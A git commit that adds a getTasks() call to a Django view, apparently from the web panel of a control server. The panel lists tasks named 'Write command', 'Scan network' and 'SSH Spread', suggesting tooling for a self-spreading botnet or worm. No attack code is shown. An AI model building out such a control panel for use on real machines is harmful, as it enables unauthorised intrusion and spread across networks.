596f405333f3e317626fd749502f57f7eab76e43
izaalstergren <izaalstergren@hotmail.com>
2023-01-11 11:41:29 +0100

    task statistics bug fixed

--- web-server/django_web_server/website/views.py
+++ web-server/django_web_server/website/views.py
@@ -18,6 +18,7 @@ def index(request):
     """
     controlServer = ControlServerHandler()
     controlServer.getClients()
+    controlServer.getTasks()
     tasks = [{'name': "Write command"}, {'name': "Scan network"}, {'name': "SSH Spread"}]
 
     if request.method == 'POST':
